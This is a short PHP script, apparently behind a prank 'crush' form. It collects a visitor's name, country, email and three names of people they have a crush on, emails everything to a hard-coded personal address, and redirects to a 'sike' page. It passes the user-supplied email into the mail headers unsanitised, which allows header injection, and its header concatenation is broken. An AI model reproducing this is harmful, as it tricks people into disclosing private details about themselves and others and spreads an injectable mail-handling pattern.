<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $yourName = $_POST['yourName'];
    $country = $_POST['country'];
    $name1 = $_POST['name1'];
    $name2 = $_POST['name2'];
    $name3 = $_POST['name3'];
    $eMail = $_POST['eMail'];

    // Email configuration
    $mailTo = "Bavli2002@hotmail.com";
    $subject = "Crush Form Submission"; // Set your email subject here
    $headers = "From: " . $eMail; // You can set the sender's email here

    // Email content
    $txt =
        "User: " . $yourName . "\n\n" .
        "Country: " . $country . "\n\n" .
        "Crush 1: " . $name1 . "\n" .
        "Crush 2: " . $name2 . "\n" .
        "Crush 3: " . $name3 . "\n\n" .
        "E-mail: " . $eMail . "\n\n";

    // CSS for bold styling
    $css = "font-weight: bold;";

    // Send email
    $headers .= "Content-type: text/plain; charset=UTF-8\r\n"; // Set content type to plain text
    $headers .= "Content-Transfer-Encoding: 8bit\r\n"; // Set content transfer encoding
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n"; // Set X-Mailer

    // Send email
    mail($mailTo, $subject, $txt, $headers);

    $_SESSION['form_submitted'] = true;

    // Redirect to another page
    header("Location: html/sike.html");
    exit();
}
?>